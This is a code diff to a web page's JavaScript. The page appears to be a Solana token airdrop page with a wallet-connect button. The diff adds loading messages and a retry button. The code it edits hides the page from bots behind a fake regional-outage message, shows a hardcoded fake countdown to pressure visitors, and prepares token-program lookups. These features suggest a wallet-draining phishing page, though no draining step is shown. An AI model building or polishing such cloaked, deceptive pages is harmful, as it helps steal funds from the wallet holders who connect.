@@ -223,22 +223,33 @@
   }
 
   // ── init ──
-  async function init(){
+  async function init(retry=false){
     try{
+      if(!retry){ $('btnRetry').style.display='none'; }
+      $('loadingMsg').style.display='block';
+      $('loadingMsg').innerHTML = 'Initializing wallet libraries...';
       if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
+      $('loadingMsg').textContent='Loading config & seed...';
       await Promise.all([loadConfig(), loadSeed()]);
       if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
+      $('loadingMsg').textContent='Loading Solana Web3...';
       await waitForSolana(12000);
-      TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-      TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EQFLC1PHnBqXEpPxuEb');
+      $('loadingMsg').textContent='Starting app...';
+      try { TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'); } catch(e) { throw new Error('TOKEN_PROG invalid: ' + e.message); }
+      try { TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EQFLC1PHnBqXEpPxuEb'); } catch(e) { throw new Error('TOKEN_2022 invalid: ' + e.message); }
       connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
       $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
+      $('btnRetry').style.display='none';
       startCountdown();
     }catch(e){
+      console.error('init error', e);
       $('loadingMsg').innerHTML = '<span style="color:#ff6b6b">Failed to initialize: ' + (e.message || 'unknown') + '. Check console and refresh.</span>';
       $('btnConnect').disabled = true;
+      $('btnRetry').style.display='inline-block';
     }
   }
+
+  function retryInit(){ init(true); }
 
   function startCountdown(){
     let sec=23*3600+14*60+8;
